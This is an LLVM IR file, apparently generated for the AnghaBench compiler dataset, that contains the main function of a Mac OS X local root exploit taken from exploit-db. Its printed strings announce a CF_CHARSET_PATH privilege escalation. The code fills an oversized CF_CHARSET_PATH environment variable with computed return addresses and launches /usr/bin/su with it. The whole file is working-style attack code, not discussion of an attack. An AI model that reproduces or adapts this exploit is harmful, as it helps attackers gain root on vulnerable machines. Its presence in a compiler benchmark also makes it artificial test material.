; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/local/extr_896.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/local/extr_896.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [50 x i8] c"(*)MacOS X[CF_CHARSET_PATH]: local root exploit.\0A\00", align 1
@.str.1 = private unnamed_addr constant [55 x i8] c"(*)by: v9@fakehalo.us, found by iDefense adv. (anon)\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [17 x i8] c"CF_CHARSET_PATH=\00", align 1
@.str.3 = private unnamed_addr constant [33 x i8] c"[*] setting up the environment.\0A\00", align 1
@exec = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [63 x i8] c"[*] executing su... (press ENTER at the \22Password: \22 prompt)\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [12 x i8] c"/usr/bin/su\00", align 1
@.str.6 = private unnamed_addr constant [3 x i8] c"su\00", align 1
@.str.7 = private unnamed_addr constant [35 x i8] c"[!] failed executing /usr/bin/su.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca [3 x i8*], align 16
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  %5 = call i32 @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str, i64 0, i64 0))
  %6 = call i32 @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.1, i64 0, i64 0))
  %7 = call i64 @malloc(i32 1101)
  %8 = inttoptr i64 %7 to i8*
  store i8* %8, i8** %3, align 8
  %9 = icmp ne i8* %8, null
  br i1 %9, label %12, label %10

10:                                               ; preds = %0
  %11 = call i32 @exit(i32 1) #3
  unreachable

12:                                               ; preds = %0
  %13 = load i8*, i8** %3, align 8
  %14 = call i32 @memcpy(i8* %13, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.2, i64 0, i64 0), i32 16)
  %15 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.3, i64 0, i64 0))
  store i32 16, i32* %2, align 4
  br label %16

16:                                               ; preds = %29, %12
  %17 = load i32, i32* %2, align 4
  %18 = icmp ult i32 %17, 1100
  br i1 %18, label %19, label %32

19:                                               ; preds = %16
  %20 = load i8*, i8** @exec, align 8
  %21 = call i32 @strlen(i8* %20)
  %22 = sub i32 -1073741830, %21
  %23 = zext i32 %22 to i64
  %24 = load i8*, i8** %3, align 8
  %25 = load i32, i32* %2, align 4
  %26 = zext i32 %25 to i64
  %27 = getelementptr inbounds i8, i8* %24, i64 %26
  %28 = bitcast i8* %27 to i64*
  store i64 %23, i64* %28, align 8
  br label %29

29:                                               ; preds = %19
  %30 = load i32, i32* %2, align 4
  %31 = add i32 %30, 4
  store i32 %31, i32* %2, align 4
  br label %16

32:                                               ; preds = %16
  %33 = load i8*, i8** %3, align 8
  %34 = getelementptr inbounds [3 x i8*], [3 x i8*]* %4, i64 0, i64 0
  store i8* %33, i8** %34, align 16
  %35 = load i8*, i8** @exec, align 8
  %36 = getelementptr inbounds [3 x i8*], [3 x i8*]* %4, i64 0, i64 1
  store i8* %35, i8** %36, align 8
  %37 = getelementptr inbounds [3 x i8*], [3 x i8*]* %4, i64 0, i64 2
  store i8* null, i8** %37, align 16
  %38 = call i32 @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.4, i64 0, i64 0))
  %39 = getelementptr inbounds [3 x i8*], [3 x i8*]* %4, i64 0, i64 0
  %40 = call i64 @execle(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0), i32 0, i8** %39)
  %41 = icmp ne i64 %40, 0
  br i1 %41, label %42, label %44

42:                                               ; preds = %32
  %43 = call i32 @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.7, i64 0, i64 0))
  br label %44

44:                                               ; preds = %42, %32
  %45 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i64 @malloc(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i64 @execle(i8*, i8*, i32, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
